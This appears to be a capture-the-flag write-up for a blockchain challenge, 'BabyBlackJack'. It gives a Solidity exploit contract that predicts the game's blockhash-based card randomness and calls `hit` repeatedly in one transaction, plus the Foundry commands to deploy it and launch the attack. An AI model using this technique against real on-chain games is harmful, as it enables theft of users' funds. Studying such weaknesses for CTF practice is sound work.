## BabyBlackJack

Randomness in `hit` is manipulable which lead to an absolute win.

We can deploy a contract which calculate the card who will be hit by the dealer, and if the card is a factor of 21 or 22, hit the same card multiple time.
It is possible because one block contains one transaction which can contain multiple call (with all the same block number though).

Here is the exploit :

```solidity
contract Exploit {

   function attack(address _victim) public {
        Chal victim = Chal(_victim);

        uint8 nbCardsToHit;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint cardValue = (blockValue % 5) + 1;

        if (cardValue == 1) {
            nbCardsToHit = 21;
        } else if (cardValue == 2) {
            nbCardsToHit = 11;
        } else if (cardValue == 3) {
            nbCardsToHit = 7;
        } else {
            revert();
        }

        victim.start_game();

        for (uint i; i < nbCardsToHit; i++) {
            victim.hit();
        }
    }
}
```

Firstly, we get the contract address :

```bash
cast call $SETUP_CONTRACT "target()" --rpc-url $RPC_URL --private-key $LOCAL_PRIVATE_KEY
```

Deploy the exploit (with foundry) :

```bash
forge create --rpc-url $RPC_URL --private-key $LOCAL_PRIVATE_KEY src/Exploit.sol:Exploit --constructor-args $CONTRACT
```

And launch the attack :

```bash
cast send $EXPLOIT_CONTRACT "attack(address)" $CONTRACT --rpc-url $RPC_URL --private-key $LOCAL_PRIVATE_KEY --gas-limit 7000000
```

The challenge is solved and we can get the flag.
